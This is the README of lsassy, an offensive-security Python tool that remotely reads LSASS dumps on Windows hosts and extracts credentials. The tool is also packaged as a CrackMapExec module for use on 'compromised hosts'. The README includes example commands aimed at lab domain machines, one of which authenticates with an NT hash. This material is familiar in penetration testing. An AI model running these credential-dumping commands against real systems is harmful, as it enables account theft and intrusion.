# lsassy

[![PyPI version](https://badge.fury.io/py/lsassy.svg)](https://badge.fury.io/py/lsassy)

Python library to remotely parse lsass dump and extract credentials.
This library uses [impacket](https://github.com/SecureAuthCorp/impacket) projects to remotely read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.

## Requirements

* Python >= 3.6
* [pypykatz](https://github.com/skelsec/pypykatz) >= 0.3.0
* [impacket](https://github.com/SecureAuthCorp/impacket)

## Basic Usage

```
lsassy [<domain>/]<user>[:<password>]@<target>:/share_name/path/to/lsass.dmp [--hashes [LM:]NT]
```

## CrackMapExec module

I wrote a CrackMapExec module that uses **lsassy** to extract credentials on compromised hosts

CrackMapExec module is in `cme` folder : [CME Module](/cme/)

## Examples

### lsassy

```
lsassy ADSEC.LOCAL/jsnow:Winter_is_coming_\!@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp

lsassy Administrateur:952c28bd2fd728898411b301475009b7@desktop01.adsec.local:/ADMIN$/lsass.dmp
```

### CME Module

![Example image](/assets/cme_example.png)

## Installing

### From pip

```
python3.7 -m pip install lsassy
```

### From sources

```
python3.7 setup.py install
```

## Acknowledgments

* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [SkelSec](http://twitter.com/skelsec) for Pypykatz, but also for his patience and help
* [mpgn](https://twitter.com/mpgn_x64) for his help and ideas
